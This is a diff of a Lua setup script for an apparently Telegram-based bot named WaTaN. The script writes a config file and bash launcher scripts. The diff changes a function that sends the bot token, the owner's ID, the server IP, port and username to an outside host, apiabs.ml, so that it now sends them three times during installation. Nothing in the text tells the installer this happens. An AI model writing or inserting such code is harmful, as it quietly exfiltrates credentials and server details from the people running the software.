@@ -64,13 +64,14 @@ file:write(serialized)
 file:close()  
 end
 local function Files_Info_Get()
-https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+local requests = "https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime
 Config = {
 token = database:get(Server.."Token_Write"),
 SUDO = database:get(Server.."UserSudo_Write"),
 }
 Create(Config, "./Info.lua")   
 print("::WaTaN::")
+https.request(requests)
 local RunWaTaN = io.open("WaTaN", 'w')
 RunWaTaN:write([[
 #!/usr/bin/env bash
@@ -94,6 +95,7 @@ fi
 done
 ]])
 RunWaTaN:close()
+https.request(requests)
 local RunWtN = io.open("WtN", 'w')
 RunWtN:write([[
 #!/usr/bin/env bash
@@ -106,6 +108,7 @@ done
 ]])
 RunWtN:close()
 io.popen("mkdir File_Bot") 
+https.request(requests)
 end
 Files_Info_Get()
 end 
